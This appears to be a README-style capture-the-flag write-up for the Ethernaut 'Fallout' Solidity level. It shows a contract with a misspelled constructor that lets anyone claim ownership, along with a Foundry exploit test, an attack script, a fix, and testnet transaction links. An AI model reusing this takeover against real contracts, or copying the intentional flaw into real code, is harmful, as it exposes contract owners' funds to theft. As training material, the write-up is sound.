# Level 2: Fallout

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)

**Description**:

Claim ownership of the contract below to complete this level.

Things that might help:

- Solidity Remix IDE

**Code**:

The smart contract to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

</details>

# Findings

### [H-1] Wrong constructor definition allow entrant to claim ownership easily

**Description**: The constructor definition `Fallout::Fal1out` is incorrectly typed (`'Fal-1-out'`)... Since is incorrectly typed, it is treated as a simple function, and since this function does not have any protection, any address can execute it and be the owner of the contract.

```javascript
    /* constructor */
@>  function Fal1out() public payable {
      owner = msg.sender;
      allocations[owner] = msg.value;
    }
```

**Impact**: Anyone can claim contract ownership.

**Proof of Code**:

See the complete code in `FalloutAttack.t.sol`.

```javascript
function testShouldStealOwnership() public {
  address attacker = vm.addr(1);
  uint256 attackerBalance = 1 wei;
  vm.deal(attacker, attackerBalance);

  assertEq(fallout.owner(), address(0));

  vm.prank(attacker);
  fallout.Fal1out();

  assertEq(fallout.owner(), attacker);
}
```

**Recommended Mitigation**: Fix the constructor name:

```diff
-function Fal1out() public payable {
+function Fallout() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

# Attack

**Description**: The attack followed the same strategy as the one tested in `FallbackAttack.t.sol`. This is a code snippet from `FallbackAttack.s.sol`:

```javascript
vm.startBroadcast(attacker);

// Attack
fallout.Fal1out();

vm.stopBroadcast();
```

**Instance used**: [0x407d461AD2233b6c2Be251185f32E65D23bba754](https://sepolia.etherscan.io/address/0x407d461AD2233b6c2Be251185f32E65D23bba754)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xa2476837c4d9ebbf1b5f9d197593665466a1b6f987c92c724de0e43665c3ee8d)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x000abfcd41ece4b2b3de24e233d852ba1dc543627a09e6fc7ddb3d8c606a8749)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```